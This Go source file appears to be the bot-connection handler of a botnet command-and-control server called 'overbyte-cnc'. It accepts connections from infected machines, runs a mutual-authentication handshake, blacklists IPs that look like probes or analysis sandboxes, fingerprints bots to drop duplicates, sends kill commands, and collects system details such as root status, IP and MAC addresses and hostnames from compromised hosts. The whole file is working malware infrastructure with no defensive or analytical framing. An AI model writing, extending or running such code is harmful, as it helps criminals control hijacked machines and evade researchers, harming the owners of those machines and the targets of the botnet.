package bot

import (
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"time"

	"overbyte-cnc/crypto"
	"overbyte-cnc/logger"
)

type Handler struct {
	manager       *Manager
	listener      net.Listener
	port          int
	secret        string
	detection     *DetectionSystem
	deduplication *DeduplicationSystem
}

func NewHandler(manager *Manager, port int, secret string, detection *DetectionSystem, dedup *DeduplicationSystem) *Handler {
	return &Handler{
		manager:       manager,
		port:          port,
		secret:        secret,
		detection:     detection,
		deduplication: dedup,
	}
}

func (h *Handler) Start() error {
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", h.port))
	if err != nil {
		return err
	}
	h.listener = listener

	logger.Info("[BOT] Listening on port %d", h.port)

	go h.acceptLoop()
	go h.manager.StartPingLoop()

	return nil
}

func (h *Handler) Stop() {
	if h.listener != nil {
		h.listener.Close()
	}
	h.manager.Stop()
}

func (h *Handler) acceptLoop() {
	for {
		conn, err := h.listener.Accept()
		if err != nil {
			return
		}

		go h.handleBot(conn)
	}
}

func (h *Handler) handleBot(conn net.Conn) {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("[BOT] Panic in handleBot: %v", r)
		}
	}()

	addr := conn.RemoteAddr().String()

	if h.detection.IsBlacklisted(addr) {
		logger.Info("[BOT] Blocked blacklisted IP: %s", addr)
		conn.Close()
		return
	}

	conn.SetReadDeadline(time.Now().Add(10 * time.Second))

	authStart := time.Now()
	authErr := PerformMutualAuth(conn, h.secret)
	authDuration := time.Since(authStart)

	if authErr != nil {
		shouldBlacklist := errors.Is(authErr, ErrAuthProcessHello) || errors.Is(authErr, ErrAuthProcessResponse)
		logger.Warn("[BOT] Mutual auth failed: %s (took %v) reason=%v", addr, authDuration, authErr)

		if shouldBlacklist {
			ip := extractIP(addr)
			if ip != "" {
				logger.Warn("[BOT] BLACKLISTING %s (malicious auth failure)", ip)
				h.detection.Blacklist(ip, "Mutual auth failed", 100)
			} else {
				logger.Warn("[BOT] Skipping blacklist: empty IP for addr %q", addr)
			}
		}
		conn.Close()
		return
	}

	authDuration = time.Since(authStart)
	score := h.detection.CheckConnection(addr, authDuration)
	if score >= h.detection.thresholdScore {
		logger.Warn("[BOT] Blocked suspicious connection: %s (score: %.1f)", addr, score)
		conn.Close()
		return
	}

	logger.Info("[BOT] Mutual auth success: %s (took %v)", addr, authDuration)

	bot := h.manager.AddBot(conn)
	logger.Info("[BOT] New connection: %s", bot.Addr)

	defer func() {
		if bot.Fingerprint != "" {
			h.deduplication.UnregisterBot(bot, bot.Fingerprint)
		}
		h.manager.RemoveBot(bot.ID)
		logger.Info("[BOT] Disconnected: %s", bot.Addr)
	}()

	for {
		conn.SetReadDeadline(time.Now().Add(h.manager.pingTimeout))

		data, err := crypto.RecvEncrypted(conn)
		if err != nil {
			return
		}

		if len(data) > 0 && data[0] == CMD_PONG {
			h.manager.UpdateLastPing(bot.ID)
		}

		if len(data) > 2 && data[0] == CMD_IDENTITY {
			archLen := int(data[1])
			offset := 2 + archLen
			if len(data) >= offset {
				arch := string(data[2:offset])
				h.manager.UpdateArch(bot.ID, arch)
				logger.Info("[BOT] Identity: %s -> %s", bot.Addr, arch)

				uuid := ""
				if len(data) > offset+1 {
					uuidLen := int(data[offset])
					if len(data) >= offset+1+uuidLen {
						uuid = string(data[offset+1 : offset+1+uuidLen])
					}
				}

				if uuid != "" {
					bot.Fingerprint = uuid
					if h.handleDuplicateBot(bot, conn, uuid, "Duplicate detected (UUID)") {
						return
					}
					h.deduplication.RegisterBot(uuid, bot)
				}
			}
		}

		if len(data) > 25 && data[0] == CMD_SYSINFO_RESP {
			sysinfoStart := time.Now()
			h.parseSysInfoResponse(bot.ID, data)
			sysinfoDuration := time.Since(sysinfoStart)

			if bot := h.manager.GetBot(bot.ID); bot != nil {
				details := map[string]interface{}{
					"cpu_cores": bot.CPUCores,
					"total_ram": bot.TotalRAM,
					"os_name":   bot.OSName,
					"kernel":    bot.Kernel,
				}
				h.detection.RecordBehavior(bot.Addr, "sysinfo_response", sysinfoDuration, details)

				if bot.Fingerprint == "" && bot.Arch != "" {
					fingerprint := h.deduplication.GenerateFingerprint(bot)
					bot.Fingerprint = fingerprint

					if h.handleDuplicateBot(bot, conn, fingerprint, "Late duplicate detected (Hardware)") {
						return
					}
					h.deduplication.RegisterBot(fingerprint, bot)
				}
			}
		}
	}
}

func (h *Handler) handleDuplicateBot(bot *Bot, conn net.Conn, fingerprint string, logPrefix string) bool {
	isDupe, existingBot := h.deduplication.IsDuplicate(fingerprint, bot.Addr)
	if !isDupe {
		return false
	}

	logger.Info("[BOT] %s: %s (existing: %s)", logPrefix, bot.Addr, existingBot.Addr)

	if h.deduplication.replaceOld {
		logger.Info("[BOT] Killing old bot: %s", existingBot.Addr)
		h.manager.KillAndRemoveBot(existingBot.ID)
		h.deduplication.RegisterBot(fingerprint, bot)
		return false
	}

	logger.Info("[BOT] Killing new bot: %s", bot.Addr)
	kill := []byte{CMD_KILL}
	if err := crypto.SendEncrypted(conn, kill); err != nil {
		logger.Error("[BOT] Failed to send kill command: %v", err)
	}
	return true
}

func (h *Handler) parseSysInfoResponse(botID string, data []byte) {
	if len(data) < 26 {
		return
	}

	offset := 1

	cpuCores := binary.BigEndian.Uint16(data[offset:])
	offset += 2

	totalRAM := binary.BigEndian.Uint32(data[offset:])
	offset += 4

	freeRAM := binary.BigEndian.Uint32(data[offset:])
	offset += 4

	uptime := binary.BigEndian.Uint32(data[offset:])
	offset += 4

	isRoot := data[offset] == 1
	offset++

	loadAvg1Raw := binary.BigEndian.Uint16(data[offset:])
	offset += 2
	loadAvg1 := float32(loadAvg1Raw) / 100.0

	loadAvg5Raw := binary.BigEndian.Uint16(data[offset:])
	offset += 2
	loadAvg5 := float32(loadAvg5Raw) / 100.0

	netIfs := data[offset]
	offset++

	procCount := binary.BigEndian.Uint16(data[offset:])
	offset += 2

	openPorts := binary.BigEndian.Uint16(data[offset:])
	offset += 2

	readStr := func() string {
		if offset >= len(data) {
			return ""
		}
		slen := int(data[offset])
		offset++
		if offset+slen > len(data) {
			slen = len(data) - offset
		}
		s := string(data[offset : offset+slen])
		offset += slen
		return s
	}

	deviceType := readStr()
	osName := readStr()
	kernel := readStr()

	info := BotSysInfo{
		CPUCores:      cpuCores,
		TotalRAM:      totalRAM,
		FreeRAM:       freeRAM,
		SystemUptime:  uptime,
		IsRoot:        isRoot,
		LoadAvg1:      loadAvg1,
		LoadAvg5:      loadAvg5,
		NetInterfaces: netIfs,
		ProcessCount:  procCount,
		OpenPorts:     openPorts,
		DeviceType:    deviceType,
		OSName:        osName,
		Kernel:        kernel,
	}

	if offset < len(data) {
		info.CPUModel = readStr()
	}
	if offset+8 <= len(data) {
		info.TotalDisk = binary.BigEndian.Uint32(data[offset:])
		offset += 4
		info.FreeDisk = binary.BigEndian.Uint32(data[offset:])
		offset += 4
	}
	if offset < len(data) {
		info.IPAddress = readStr()
	}
	if offset < len(data) {
		info.MACAddress = readStr()
	}
	if offset < len(data) {
		info.Hostname = readStr()
	}
	if offset < len(data) {
		info.ArchName = readStr()
	}
	if offset+4 <= len(data) {
		info.SwapTotal = binary.BigEndian.Uint32(data[offset:])
		offset += 4
	}
	if offset+2 <= len(data) {
		raw15 := binary.BigEndian.Uint16(data[offset:])
		offset += 2
		info.LoadAvg15 = float32(raw15) / 100.0
	}
	if offset+2 <= len(data) {
		info.OpenFDCount = binary.BigEndian.Uint16(data[offset:])
		offset += 2
	}

	h.manager.UpdateBotSysInfo(botID, info)

	logger.Info("[BOT] SysInfo: %s -> CPU:%d RAM:%d/%dMB %s", botID, cpuCores, freeRAM, totalRAM, osName)
}
